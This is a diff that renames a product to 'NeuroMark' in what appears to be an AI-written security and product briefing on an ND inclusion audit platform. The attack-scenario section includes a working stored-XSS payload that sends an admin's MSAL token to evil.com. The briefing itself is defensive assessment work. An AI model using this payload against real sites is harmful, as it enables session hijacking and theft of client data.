@@ -1,15 +1,15 @@
-I can see you've uploaded the three documents and have the master analyzer prompt ready. Let me read all three files and run the full analysis for you right now.Now I have read all three documents in full. Here is the complete master briefing:
+﻿I can see you've uploaded the three documents and have the master analyzer prompt ready. Let me read all three files and run the full analysis for you right now.Now I have read all three documents in full. Here is the complete master briefing:
 
 ---
 
-# Neurvex — Master Briefing
+# NeuroMark — Master Briefing
 
 ---
 
 ## 1. Application Understanding
 
 **Summary in 300 words:**
-Neurvex (Orchvate Audit) is a web-based ND inclusion audit platform. Organizations send representatives to fill a 45-question form across 8 dimensions — Leadership & Culture, Recruitment & Onboarding, Work Environment, Built Environment, Talent Management, Communication, Products & Customer Experience, and Suppliers & Procurement. The backend scores responses using a weighted engine producing a score out of 20, mapped to 4 maturity levels: Foundational, Progressing, Developing, Leading. After submission, a personalized HTML email with a radar chart is automatically dispatched via Azure Communication Services. Orchvate admins get notified instantly, review submissions through a dashboard, edit the generated report if needed, and send it to the organization. Auth for admins is via Microsoft Entra ID SSO. The stack is Vue 3 frontend, FastAPI Python backend, PostgreSQL database, all containerized and hosted on Azure Container Apps.
+NeuroMark (Orchvate Audit) is a web-based ND inclusion audit platform. Organizations send representatives to fill a 45-question form across 8 dimensions — Leadership & Culture, Recruitment & Onboarding, Work Environment, Built Environment, Talent Management, Communication, Products & Customer Experience, and Suppliers & Procurement. The backend scores responses using a weighted engine producing a score out of 20, mapped to 4 maturity levels: Foundational, Progressing, Developing, Leading. After submission, a personalized HTML email with a radar chart is automatically dispatched via Azure Communication Services. Orchvate admins get notified instantly, review submissions through a dashboard, edit the generated report if needed, and send it to the organization. Auth for admins is via Microsoft Entra ID SSO. The stack is Vue 3 frontend, FastAPI Python backend, PostgreSQL database, all containerized and hosted on Azure Container Apps.
 
 **Core value:** It turns the vague concept of neuro-inclusion into a measurable score with a clear diagnosis and implied consulting need — making it simultaneously a diagnostic tool and a sales pipeline for Orchvate.
 
@@ -151,7 +151,7 @@ To reach 90+ in each: Security needs the top 6 fixes from Section 2. Performance
 - The `submissions` table — contains sensitive organizational self-assessment data about ND practices
 - The `admin_users` table — dropping this would lock Orchvate out of their own platform
 - The admin dashboard session — hijacking it gives full platform control
-- ACS credentials in environment variables — stealing these allows sending emails impersonating Neurvex
+- ACS credentials in environment variables — stealing these allows sending emails impersonating NeuroMark
 
 **Most realistic attack scenario right now:**
 A competitor submits an audit with `<script>document.location='https://evil.com?token='+localStorage.getItem('msal.token')</script>` as their company name. An Orchvate admin opens their dashboard to review the submission. The script executes, extracts the MSAL token from localStorage, and sends it to the attacker. The attacker now has a valid admin session and can read every other organization's audit data.
@@ -259,13 +259,13 @@ Ship all 6 Phase 1 security fixes. Do not add a single new feature until this is
 Complete Phase 2 stability work (PgBouncer, retry logic, health endpoint, audit logs). Then ship progress saving, dimension-level reporting, and the dyslexia typography toggle. These three features have low-to-medium complexity and immediately improve both conversion and brand credibility.
 
 **Next 6 months:**
-Build org accounts, CRM integration, and re-audit tracking. These three together transform Neurvex from a one-shot diagnostic into a recurring SaaS product with a measurable retention loop and a direct sales pipeline.
+Build org accounts, CRM integration, and re-audit tracking. These three together transform NeuroMark from a one-shot diagnostic into a recurring SaaS product with a measurable retention loop and a direct sales pipeline.
 
 **Biggest risk right now:** The XSS + missing JWT middleware combination. A single malicious form submission could result in a full admin session takeover and exposure of every organization's audit data. This is not a theoretical risk — it requires zero technical sophistication to exploit.
 
-**Biggest opportunity:** CRM integration. Every audit submission is already a qualified sales lead. Automating the handoff to HubSpot or Salesforce with the maturity score attached turns Neurvex into Orchvate's highest-converting lead generation tool at near-zero marginal cost.
+**Biggest opportunity:** CRM integration. Every audit submission is already a qualified sales lead. Automating the handoff to HubSpot or Salesforce with the maturity score attached turns NeuroMark into Orchvate's highest-converting lead generation tool at near-zero marginal cost.
 
 **Is it ready for real clients?** Not yet — but it is close. The core pipeline works. The UX is thoughtful. The architecture is sound. But shipping it to paying enterprise clients with open SQL injection and no JWT validation is a liability, not just a risk. Two focused weeks of security work would change that answer to yes.
 
 **Executive summary for a non-technical founder:**
-Neurvex works — the audit form, scoring, and email pipeline all function end to end, and the product concept is strong. But right now, the application has several security gaps that could allow someone to steal all your clients' audit data or crash the system with a simple automated attack. None of these are hard to fix — they are roughly two weeks of focused engineering work. Once those are closed, the product is genuinely ready for enterprise clients, and the next priority should be connecting audit completions directly into your sales pipeline, which would make every organization that fills out the form an automatic warm lead for your consulting team.
+NeuroMark works — the audit form, scoring, and email pipeline all function end to end, and the product concept is strong. But right now, the application has several security gaps that could allow someone to steal all your clients' audit data or crash the system with a simple automated attack. None of these are hard to fix — they are roughly two weeks of focused engineering work. Once those are closed, the product is genuinely ready for enterprise clients, and the next priority should be connecting audit completions directly into your sales pipeline, which would make every organization that fills out the form an automatic warm lead for your consulting team.
